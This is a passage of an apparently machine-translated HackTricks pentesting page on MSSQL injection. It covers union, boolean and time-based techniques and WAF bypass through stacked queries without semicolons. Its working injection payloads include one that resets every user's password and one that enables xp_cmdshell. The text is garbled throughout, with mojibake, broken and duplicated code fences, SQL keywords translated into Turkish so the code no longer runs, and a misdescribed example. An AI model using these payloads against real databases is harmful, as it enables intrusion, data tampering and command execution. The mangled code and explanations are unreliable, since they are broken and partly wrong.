MSSQL enjeksiyonu, bir web uygulamasÄ±nÄ±n giriÅŸ alanlarÄ±na veya parametrelerine kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek gerÃ§ekleÅŸtirilir. Bu, saldÄ±rganÄ±n veritabanÄ± sorgularÄ±nÄ± manipÃ¼le etmesine ve istediÄŸi verilere eriÅŸmesine olanak tanÄ±r.

MSSQL enjeksiyonu saldÄ±rÄ±larÄ±nda yaygÄ±n olarak kullanÄ±lan bazÄ± teknikler ÅŸunlardÄ±r:

- **Union SaldÄ±rÄ±sÄ±**: BirleÅŸtirme saldÄ±rÄ±sÄ±, bir SQL sorgusuna eklenen ek bir SELECT ifadesi aracÄ±lÄ±ÄŸÄ±yla verilerin Ã§alÄ±nmasÄ±nÄ± saÄŸlar. Bu, saldÄ±rganÄ±n veritabanÄ±ndan istediÄŸi bilgileri almasÄ±na olanak tanÄ±r.
- **Boolean SaldÄ±rÄ±sÄ±**: Boolean saldÄ±rÄ±sÄ±, saldÄ±rganÄ±n doÄŸru veya yanlÄ±ÅŸ yanÄ±tlar alarak veritabanÄ± hakkÄ±nda bilgi edinmesini saÄŸlar. Bu, saldÄ±rganÄ±n veritabanÄ± yapÄ±sÄ±nÄ± keÅŸfetmesine yardÄ±mcÄ± olur.
- **Time-Based SaldÄ±rÄ±**: Zaman tabanlÄ± saldÄ±rÄ±, saldÄ±rganÄ±n SQL sorgusunun yanÄ±t sÃ¼resini kullanarak veritabanÄ± hakkÄ±nda bilgi edinmesini saÄŸlar. Bu, saldÄ±rganÄ±n veritabanÄ± yapÄ±sÄ±nÄ± keÅŸfetmesine yardÄ±mcÄ± olur.

## MSSQL Enjeksiyonu Ã–rneÄŸi

AÅŸaÄŸÄ±daki URL, MSSQL enjeksiyonu saldÄ±rÄ±sÄ±nÄ±n bir Ã¶rneÄŸini gÃ¶stermektedir:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

Bu URL'de, `id` parametresine `0xunion+select\Nnull,@@version,null+from+users--` deÄŸeri verilmiÅŸtir. Bu, birleÅŸtirme saldÄ±rÄ±sÄ± kullanarak veritabanÄ±ndan kullanÄ±cÄ± tablosunun sÃ¼rÃ¼m bilgisini Ã§almayÄ± amaÃ§lamaktadÄ±r.

SaldÄ±rgan, `union select` ifadesini kullanarak mevcut sorguya ek bir SELECT ifadesi ekler. `@@version` ifadesi, MSSQL veritabanÄ±nÄ±n sÃ¼rÃ¼m bilgisini dÃ¶ndÃ¼rÃ¼r. `null` ifadesi ise diÄŸer sÃ¼tunlarÄ± doldurmak iÃ§in kullanÄ±lÄ±r.

SonuÃ§ olarak, saldÄ±rgan, `@@version` deÄŸerini kullanarak MSSQL veritabanÄ±nÄ±n sÃ¼rÃ¼m bilgisini elde eder.

Bu Ã¶rnek, MSSQL enjeksiyonunun temel bir Ã¶rneÄŸini gÃ¶stermektedir. SaldÄ±rganlar, bu teknikleri kullanarak daha karmaÅŸÄ±k saldÄ±rÄ±lar gerÃ§ekleÅŸtirebilir ve veritabanÄ± Ã¼zerinde daha fazla kontrol elde edebilir.
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
```sql
SELECT 'a' SELECT 'b'
```

Bu SQL sorgusu, 'a' ve 'b' deÄŸerlerini dÃ¶ndÃ¼rmek iÃ§in kullanÄ±lÄ±r.
```

So for example, multiple queries such as:

```sql
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

```sql
kullan [tempdb]
tablo oluÅŸtur [test] ([id] int)
ekle [test] deÄŸerler(1)
seÃ§ [id] [test] iÃ§inden
tablo sil [test]
```
```

Can be reduced to:

```sql
```sql
Kullan[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

```sql
Kullan[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Sonuna gereksiz bir exec() ekleyerek ve WAF'Ä±n bunun geÃ§erli bir sorgu olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmesini saÄŸlayarak
admina'union select 1,'admin','testtest123'exec('select 1')--
## Bu ÅŸu ÅŸekilde olacak:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Garip bir ÅŸekilde oluÅŸturulmuÅŸ sorgular kullanarak
admin'exec('update[users]set[password]=''a''')--
## Bu ÅŸu ÅŸekilde olacak:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Veya xp_cmdshell'i etkinleÅŸtirme
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Bu ÅŸu ÅŸekilde olacak:
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--'
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
